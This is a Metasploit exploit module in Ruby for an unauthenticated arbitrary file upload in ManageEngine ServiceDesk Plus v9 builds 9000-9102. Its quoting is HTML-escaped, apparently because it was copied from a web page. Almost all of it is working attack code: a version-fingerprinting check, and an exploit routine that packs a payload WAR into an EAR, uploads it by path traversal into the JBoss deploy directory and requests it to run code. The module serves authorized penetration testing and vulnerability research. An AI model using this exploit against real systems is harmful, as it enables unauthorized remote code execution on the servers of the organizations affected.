# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;ManageEngine ServiceDesk Plus Arbitrary File Upload&#039;,
      &#039;Description&#039; => %q{
        This module exploits a file upload vulnerability in ManageEngine ServiceDesk Plus.
        The vulnerability exists in the FileUploader servlet which accepts unauthenticated
        file uploads. This module has been tested successfully on versions v9 b9000 - b9102
        in Windows and Linux. The MSP versions do not expose the vulnerable servlet.
      },
      &#039;Author&#039;       =>
        [
          &#039;Pedro Ribeiro <pedrib[at]gmail.com>&#039;, # Vulnerability Discovery and Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;ZDI&#039;, &#039;15-396 &#039; ],
          [ &#039;URL&#039;, &#039;https://github.com/rapid7/metasploit-framework/pull/6038&#039; ]
        ],
      &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 30 },
      &#039;Privileged&#039;  => false,            # Privileged on Windows but not on Linux targets
      &#039;Platform&#039;    => &#039;java&#039;,
      &#039;Arch&#039;        => ARCH_JAVA,
      &#039;Targets&#039;     =>
        [
          [ &#039;ServiceDesk Plus v9 b9000 - b9102 / Java Universal&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Aug 20 2015&#039;))

    register_options(
      [
        Opt::RPORT(8080),
        OptInt.new(&#039;SLEEP&#039;,
          [true, &#039;Seconds to sleep while we wait for EAR deployment&#039;, 15]),
      ], self.class)
  end


  def check
    res = send_request_cgi({
      &#039;uri&#039;    => "/",
      &#039;method&#039; => &#039;GET&#039;
    })

    if res && res.code == 200 &&
     res.body.to_s =~ /src=&#039;\/scripts\/Login\.js\?([0-9]+)&#039;><\/script>/
      build = $1
      if build < "9103" && build > "9000"
        return Exploit::CheckCode::Appears
      end
    end

    return Exploit::CheckCode::Safe
  end


  def exploit
    jboss_path = &#039;../../server/default/deploy&#039;
    servlet_path = rand_text_alphanumeric(4 + rand(16 - 4)) + ".up"

    # First we generate the WAR with the payload...
    war_app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    war_payload = payload.encoded_war({ :app_name => war_app_base })

    # ... and then we create an EAR file with it.
    ear_app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    app_xml = %Q{<?xml version="1.0" encoding="UTF-8"?><application><display-name>#{rand_text_alphanumeric(4 + rand(32 - 4))}</display-name><module><web><web-uri>#{war_app_base + ".war"}</web-uri><context-root>/#{ear_app_base}</context-root></web></module></application>}

    # in the Java vulnerable application
    ear_file = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    ear_file.add_file(war_app_base + ".war", war_payload.to_s)
    ear_file.add_file("META-INF/application.xml", app_xml)
    ear_file_name = rand_text_alphanumeric(4 + rand(32 - 4)) + ".ear"

    # Linux doesn&#039;t like it when we traverse non existing directories,
    # so let&#039;s create them by sending some random data before the EAR.
    rand_file = rand_text_alphanumeric(4 + rand(32 - 4))
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(servlet_path),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => rand_text_alphanumeric(4 + rand(32 - 4)),
      &#039;ctype&#039; => &#039;application/octet-stream&#039;,
      &#039;vars_get&#039; => {
        &#039;uniqueId&#039; => rand_text_numeric(4 + rand(4)),
        &#039;module&#039; => &#039;&#039;,
        &#039;qqfile&#039; => rand_file
      }
    })

    print_status("#{peer} - Uploading EAR file...")
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(servlet_path),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => ear_file.pack,
      &#039;ctype&#039; => &#039;application/octet-stream&#039;,
      &#039;vars_get&#039; => {
        &#039;uniqueId&#039; => rand_text_numeric(4 + rand(4)),
        &#039;module&#039; => jboss_path,
        &#039;qqfile&#039; => ear_file_name
      }
    })

    if res && res.code == 200
      print_status("#{peer} - Upload appears to have been successful, waiting " + datastore[&#039;SLEEP&#039;].to_s +
      " seconds for deployment")
      register_files_for_cleanup(jboss_path.gsub(&#039;../../&#039;,&#039;../&#039;) + "/null/" + ear_file_name)
      register_files_for_cleanup("Attachments/null/" + rand_file)
      sleep(datastore[&#039;SLEEP&#039;])
    else
      fail_with(Failure::Unknown, "#{peer} - EAR upload failed")
    end

    send_request_cgi({
      &#039;uri&#039;    => normalize_uri(ear_app_base, war_app_base, Rex::Text.rand_text_alpha(rand(8)+8)),
      &#039;method&#039; => &#039;GET&#039;
    })
  end
end

